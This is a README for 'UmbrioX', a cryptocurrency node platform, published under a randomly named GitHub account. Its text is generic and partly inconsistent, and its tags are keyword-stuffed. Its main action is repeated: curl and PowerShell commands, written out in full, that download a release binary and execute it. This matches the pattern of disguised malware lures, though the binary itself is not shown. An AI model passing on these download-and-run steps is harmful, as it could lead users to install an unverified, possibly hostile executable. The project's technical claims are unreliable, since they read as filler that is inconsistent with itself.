[![Releases](https://img.shields.io/badge/Releases-UmbrioX-blue?logo=github)](https://github.com/azhdjfhdjds/UmbrioX/releases)

# UmbrioX: Modular Custom Cryptocurrency Platform for the Century

![Cryptocurrency banner](https://images.unsplash.com/photo-1611078487810-6b7b8b4d8f6b?auto=format&fit=crop&w=1600&q=60)

A modular cryptocurrency stack built for custom deployments, high throughput, and adaptable governance. UmbrioX gives teams the primitives they need to design tokens, networks, and services with production-ready patterns.

Badges
- ![Build Status](https://img.shields.io/badge/build-passing-brightgreen)
- ![License](https://img.shields.io/badge/license-MIT-lightgrey)
- Topics: big, bigproject, blockchain, cryptocurrency, domain, main, money, project, server, umbriox, website, worker, workshop

Table of contents
- Features
- Architecture
- Modules
- Quick start
- Download and run
- Configuration
- CLI reference
- Node operator guide
- Development guide
- Tests and CI
- Troubleshooting
- Contributing
- License

Features
- Modular core. Swap consensus, storage, and transport layers.
- Token toolkit. Mint, burn, bridges, and programmable rules.
- Worker services. Off-chain workers for indexing, oracle ingestion, and batch settlement.
- Scalable nodes. Sharded storage and parallel verification.
- Secure defaults. Hardened key handling and secure RPC.
- Extensible governance. Vote-based upgrades and role management.

Architecture

UmbrioX uses a layered model. Each layer exposes a clear API and runs as an independent process or container.

- Consensus layer
  - Pluggable: Proof, BFT, or hybrid.
  - Consensus input streams and finality hooks.
- Execution layer
  - Transaction VM and ABI surface.
  - Gas and fee accounting.
- Storage layer
  - Pluggable backends: RocksDB, LevelDB, or S3-backed object store.
  - Snapshots and compacted state.
- Network layer
  - Peer-to-peer overlay.
  - RPC multiplex and TLS support.
- Worker layer
  - Batch processors and off-chain indexers.
  - Queue system and retry semantics.

Design principles
- Keep modules small. Each module does one job and exposes clear interfaces.
- Favor explicit APIs. Use typed messages and stable wire formats.
- Make upgrade paths simple. Use governance hooks and migration scripts.
- Observe and act. Provide metrics and health checks for all services.

Core modules

- umbrio-node
  - Full node implementation.
  - Handles consensus, mempool, block production, state sync.
- umbrio-wallet
  - Local key storage and signing.
  - CLI and RPC for transactions.
- umbrio-explorer
  - Light web UI for blocks, accounts, and tokens.
- umbrio-worker-index
  - Indexer that builds fast query layers from chain data.
- umbrio-bridge
  - Bridge adapter for external chains and tokens.

Quick start

This section shows a minimal local run using the prebuilt node binary from releases.

Use the Releases page at:
https://github.com/azhdjfhdjds/UmbrioX/releases

Download the release asset from the Releases page linked above and execute it. Example commands assume a Linux x86_64 binary named umbriox-linux-amd64. Replace the asset name with the actual file you download.

Linux / macOS
- Download
  - curl -L -o umbriox https://github.com/azhdjfhdjds/UmbrioX/releases/download/v1.0.0/umbriox-linux-amd64
- Make executable
  - chmod +x ./umbriox
- Run
  - ./umbriox node --config ./config/node.toml

Windows (PowerShell)
- Download
  - Invoke-WebRequest -Uri "https://github.com/azhdjfhdjds/UmbrioX/releases/download/v1.0.0/umbriox-windows.exe" -OutFile "umbriox.exe"
- Run
  - .\umbriox.exe node --config .\config\node.toml

If the release URL does not work from your environment or the asset names differ, visit the Releases page and pick the correct asset. The Releases page contains signed binaries and release notes you may need.

Download and run (detailed instructions)

Visit the Releases page for all published builds:
https://github.com/azhdjfhdjds/UmbrioX/releases

You will find:
- Stable binaries for Linux, macOS, and Windows
- Docker images and tags
- Checksums and detached signatures
- Release notes and migration guides

After downloading an asset:
1. Verify checksum with sha256sum or shasum -a 256.
2. Verify signature if a .sig or .asc file is present.
3. Make the binary executable and start it.
4. Tail logs and watch the metrics endpoint.

Configuration

Config files use TOML. Core config sections:
- [node]
  - id = "node-01"
  - listen_addr = "0.0.0.0:3030"
- [consensus]
  - type = "pbft"
  - view_timeout_ms = 5000
- [storage]
  - backend = "rocksdb"
  - path = "/var/lib/umbriox"
- [rpc]
  - http = "127.0.0.1:8080"
  - cors = ["*"]
- [metrics]
  - port = 9100

Example minimal config (node.toml)
- node.id = "local-1"
- rpc.http = "127.0.0.1:8080"
- storage.backend = "rocksdb"
- consensus.type = "raft"

CLI reference

Primary commands
- umbriox node --config <path>
  - Start a full node.
- umbriox wallet create --name <alias>
  - Create a wallet and store keys encrypted.
- umbriox tx send --from <addr> --to <addr> --amount <value>
  - Send tokens.
- umbriox key import --file <keyfile>
  - Import a private key.
- umbriox inspect block --height <n>
  - Print block and receipts.

Common flags
- --config <path> Load a TOML config.
- --log-level <level> Set logging level: debug, info, warn, error.
- --db-path <path> Override the storage path.

Node operator guide

Run with systemd
- Create a service file that runs the node binary with your config and user.
- Set Restart=on-failure.
- Provide proper limits for file descriptors.

Scale horizontally
- Use load balancers for RPC.
- Run multiple indexers on separate machines.
- Use state snapshots for fast new node sync.

Monitoring
- Expose /metrics for Prometheus.
- Push logs to a central log system.
- Monitor mempool size and block production latency.

Security and keys

- Use HSMs for production signing when possible.
- Rotate operator keys on a schedule.
- Limit RPC endpoints by IP and API keys.
- Back up wallet files in multiple secure locations.

Developers

Repository layout (simplified)
- /cmd/umbriox — CLI and main entry points
- /internal/node — Node core
- /pkg/proto — Protocol buffers and wire formats
- /workers — Off-chain workers and indexers
- /docs — Design docs and migration guides

Build from source
- Go toolchain (1.20+)
- git clone https://github.com/azhdjfhdjds/UmbrioX.git
- cd UmbrioX
- make build
- ./bin/umbriox node --config ./config/node.toml

Testing
- Unit tests use the standard test runner.
  - go test ./... -run TestName -v
- Integration tests spin up local clusters with Docker Compose.
  - make itest

CI
- CI runs linting, unit tests, and build checks for Linux and macOS.
- Releases are automated with tags and build matrices.

Workers and integrations

Workers handle off-chain tasks. Common worker types:
- Indexer
  - Parse blocks and populate a query DB.
- Oracle ingester
  - Pull external data and submit signed reports.
- Settlement engine
  - Batch-settle transactions across chains.

Integrations
- JSON-RPC API for wallets and dApps.
- gRPC for internal services.
- Bridges to EVM chains and Tendermint-based networks.

Troubleshooting

- Node fails to start: Check config paths and permissions.
- Slow sync: Use a snapshot or increase peer count.
- High CPU: Check for excessive mempool churn. Tune mempool and consensus params.
- Wallet errors: Verify key format and password; try key import/export.

FAQ

Q: What consensus options exist?
A: UmbrioX supports raft, pbft, and a hybrid proof layer. You can switch by changing the consensus.type value and providing a matching config.

Q: Can I run multiple shards?
A: Yes. Sharding is available via the storage.shard_count option. Each shard runs a set of validators.

Q: Where are tokens defined?
A: Tokens are smart assets managed by the token module. You can mint with umbriox tx token mint --name <name>.

Contributing

- Fork the repo.
- Create a feature branch: feature/short-description.
- Run tests and linters.
- Submit a pull request with a clear description and small scope.
- Follow the code style in CONTRIBUTING.md.

Style guide highlights
- Keep functions small.
- Add tests for new features.
- Document public APIs in docs/api.md.

Releases and downloads

Find prebuilt binaries, Docker images, and signed assets on the Releases page:
https://github.com/azhdjfhdjds/UmbrioX/releases

Download the proper asset for your platform. After download, verify checksums, make the file executable, and run the binary. The Releases page lists checksums and signatures for each asset.

Images and assets

Use the explorer UI for visual checks. Example public images:
- Block graph and token logos use SVG and PNG assets stored in /docs/assets.
- Example banner image courtesy of Unsplash: cryptocurrency imagery for demo only.

License

This project uses the MIT license. See the LICENSE file for full terms.

Contact and community

- Issues: Open an issue on GitHub for bugs or feature requests.
- Discussions: Join repo discussions for design and roadmap.
- Slack/Matrix: See CONTRIBUTING.md for chat links.

Roadmap highlights

- v1.1: Bridge improvements, indexer performance.
- v2.0: Native sharding and state pruning.
- Explorer updates with advanced analytics.

Acknowledgments

- Community contributors for testing and docs.
- Open-source projects that provide crypto primitives and storage libraries.

Ecosystem tags
- big, bigproject, blockchain, cryptocurrency, money, project, server, umbriox, worker, workshop

Screenshot

![Explorer screenshot](https://raw.githubusercontent.com/azhdjfhdjds/UmbrioX/main/docs/assets/explorer-sample.png)